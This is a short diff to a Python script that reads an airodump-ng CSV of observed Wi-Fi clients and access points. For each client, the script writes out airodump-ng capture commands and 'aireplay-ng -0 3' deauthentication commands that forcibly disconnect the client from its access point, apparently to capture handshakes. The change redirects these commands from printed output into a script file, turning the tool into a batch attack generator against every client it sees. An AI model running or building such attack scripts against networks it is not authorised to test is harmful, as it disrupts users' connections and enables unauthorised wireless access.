@@ -21,9 +21,11 @@ with open(file) as csvFile:
 		elif reader.line_num > endLine + 1 and not str(r) == "[]" and not r[5] == "(not associated) ":
 			stationMacAndAP[r[0]] = r[5]
 
+with open("script.txt","w") as out:
 
-for i in stationMacAndAP:
-	channel = apMacAndChannel[stationMacAndAP[i]]
-	apmac = stationMacAndAP[i]
-	print("airodump-ng " + interface + " -a --berlin 60 -c " + channel + " --bssid " + apmac)
-	print("aireplay-ng -0 3 -a " + apmac + " -c " + i)
+	for i in stationMacAndAP:
+		channel = apMacAndChannel[stationMacAndAP[i]]
+		apmac = stationMacAndAP[i]
+		#out.write("Station " + i + " on AP " + apmac + " ...")
+		out.write("airodump-ng " + interface + " -a --berlin 60 -c " + channel + " --bssid " + apmac + "\n")
+		out.write("aireplay-ng -0 3 -a " + apmac + " -c " + i + "\n")
